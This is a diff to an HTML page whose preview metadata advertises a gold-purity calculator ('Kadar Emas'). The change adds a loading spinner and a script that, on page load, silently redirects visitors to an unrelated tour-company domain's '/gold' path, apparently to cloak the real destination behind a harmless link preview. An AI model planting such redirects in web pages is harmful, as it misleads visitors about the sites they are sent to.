@@ -3,4 +3,29 @@
 <meta property='og:title' content='Kadar Emas'>
 <meta name='description' content='Berdasarkan Berat Jenis'>
 <meta property="og:image" content='https://sukedi.github.io/emas/emas.jpg'>
-</head><body></body></html>
+<style>
+    #spinner {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      border: 4px solid #ccc;
+      border-top: 4px solid #333;
+      border-radius: 50%;
+      width: 40px; height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+</style>
+</head><body>
+<div id="spinner" style="display:none;"></div>
+<script>
+function go() {
+  document.getElementById("spinner").style.display = "block"; // Tampilkan spinner
+  window.location.href = "https://tjokrotourtransport.com/gold";
+}
+go();
+</script>
+</body></html>
